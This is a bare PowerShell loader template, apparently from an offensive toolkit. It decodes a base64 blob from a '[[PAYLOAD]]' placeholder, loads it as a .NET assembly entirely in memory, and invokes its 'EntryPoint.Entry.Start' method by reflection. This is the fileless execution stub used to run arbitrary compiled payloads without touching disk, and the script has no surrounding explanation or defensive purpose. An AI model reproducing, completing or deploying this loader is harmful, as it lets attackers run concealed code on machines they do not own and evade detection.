$b64 = '[[PAYLOAD]]'
$bytes = [System.Convert]::FromBase64String($b64)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod =  $assembly.GetType('EntryPoint.Entry').GetMethod('Start', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, ($null))